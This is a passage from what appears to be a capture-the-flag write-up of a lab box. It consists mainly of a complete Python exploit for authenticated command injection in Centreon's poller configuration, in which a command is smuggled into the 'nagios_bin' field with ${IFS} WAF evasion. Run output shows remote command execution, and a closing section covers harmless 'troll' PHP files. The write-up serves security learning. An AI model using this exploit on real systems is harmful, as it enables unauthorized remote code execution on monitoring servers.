# Tested on: CentOS 7.6 / PHP 5.4.16
'''

import re
import requests
import socket
import sys
import warnings
from bs4 import BeautifulSoup

# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

if len(sys.argv) != 5:
    print(len(sys.argv))
    print("[~] Usage : ./centreon-exploit.py url username password command")
    exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
command = sys.argv[4].replace(" ", '${IFS}')

burp = {'http': 'http://localhost:8080'}

request = requests.session()
request.proxies = burp
print("[+] Retrieving CSRF token to submit the login form")
page = request.get(url+"/index.php")
html_content = page.text
soup = BeautifulSoup(html_content, features="lxml")
token = soup.findAll('input')[3].get("value")

login_info = {
    "useralias": username,
    "password": password,
    "submitLogin": "Connect",
    "centreon_token": token
}
login_request = request.post(url+"/index.php", login_info)
print("[+] Login token is : {0}".format(token))
if "Your credentials are incorrect." not in login_request.text:
    print("[+] Logged In Sucssfully")
    print("[+] Retrieving Poller token")

    poller_configuration_page = url + "/main.get.php?p=60901"
    get_poller_token = request.get(poller_configuration_page)
    poller_html = get_poller_token.text
    poller_soup = BeautifulSoup(poller_html, features="lxml")
    poller_token = poller_soup.findAll('input')[24].get("value")
    print("[+] Poller token is : {0}".format(poller_token))

    payload_info = {
        "name": "Central",
        "ns_ip_address": "127.0.0.1",
        # this value should be 1 always
        "localhost[localhost]": "1",
        "is_default[is_default]": "0",
        "remote_id": "",
        "ssh_port": "22",
        "init_script": "centengine",
        # this value contains the payload , you can change it as you want
        "nagios_bin": f'{command}||',
        "nagiostats_bin": "/usr/sbin/centenginestats",
        "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
        "centreonbroker_cfg_path": "/etc/centreon-broker",
        "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
        "centreonbroker_logs_path": "",
        "centreonconnector_path": "/usr/lib64/centreon-connector",
        "init_script_centreontrapd": "centreontrapd",
        "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
        "ns_activate[ns_activate]": "1",
        "submitC": "Save",
        "id": "1",
        "o": "c",
        "centreon_token": poller_token,
    }

    send_payload = request.post(poller_configuration_page, payload_info)
    print(f"[*] Payload inject status code: {send_payload.status_code}")
    if send_payload.status_code == 403:
        print("[-] WAF blocked command. Try something else")
        sys.exit()
    print("[+] Injecting Done, triggering the payload")
    generate_xml_page = url + "/include/configuration/configGenerate/xml/generateFiles.php"
    xml_page_data = {
        "poller": "1",
        "debug": "true",
        "generate": "true",
    }
    try:
        resp = request.post(generate_xml_page, xml_page_data, timeout=5)
        res = re.findall("id='debug_1'>(.*)<br><br></div><br/>]]", resp.text)[0]
        print(res.replace('<br>','\n'))
    except requests.Timeout:
        pass

else:
    print("[-] Wrong credentials")
    exit()

```

When it runs, it looks like, with both a failure (`hostname` is blacklisted) and a success:

```

root@kali# ./centreon-0xdf.py http://10.10.10.157/centreon/ admin password1 "hostname"
[+] Retrieving CSRF token to submit the login form
[+] Login token is : 829c505845f89f2057d44136440c8665
[+] Logged In Sucssfully
[+] Retrieving Poller token
[+] Poller token is : ca4c0c82566cef21642020c602a2feac
[*] Payload inject status code: 403
[-] WAF blocked command. Try something else

root@kali# ./centreon-0xdf.py http://10.10.10.157/centreon/ admin password1 "uname -a"
[+] Retrieving CSRF token to submit the login form
[+] Login token is : f1751b09c89e8cded9ed6d469bec20d6
[+] Logged In Sucssfully
[+] Retrieving Poller token
[+] Poller token is : e056d43e94946b0dfeec827b36ff26fd
[*] Payload inject status code: 200
[+] Injecting Done, triggering the payload
Linux Wall 4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

```

### Trolls

One of my least favorite thing about this box was a series of weird troll files sprinkled all over it. It’s not clear to me why authors add these kinds of things without any pretense that they belong on the boc. That said, I always check them out once I have a shell.

On the main webroot, `aa.php` and `panel.php` were files I spent some time fuzzing.

`aa.php`:

```

<?php

echo 1;

?>

```

`panel.php`:

```

<?php

echo "Just a test for php file !";

?>

```

There was another added at the `/centreon/` root, `a.php`:

```

<?php
echo 1;

?>

```

Nothing here interesting.